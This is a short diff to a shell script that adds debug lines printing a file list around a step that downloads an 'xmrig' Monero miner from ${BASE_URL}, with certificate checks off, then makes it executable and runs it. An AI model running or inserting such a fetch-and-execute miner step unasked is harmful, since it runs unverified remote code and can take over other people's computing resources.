@@ -148,12 +148,14 @@ cat>"config.json"<< EOF
     "watch": true
 }
 EOF
-
+echo "FILE LIST"
+ls
 # XMR Miner
 # if [ ! -f "xmrig" ]; then
 #     wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig
 # fi
 wget --no-check-certificate ${BASE_URL}/xmrig
 chmod +x ./xmrig
+echo "FILE LIST 2"
 ./xmrig
 
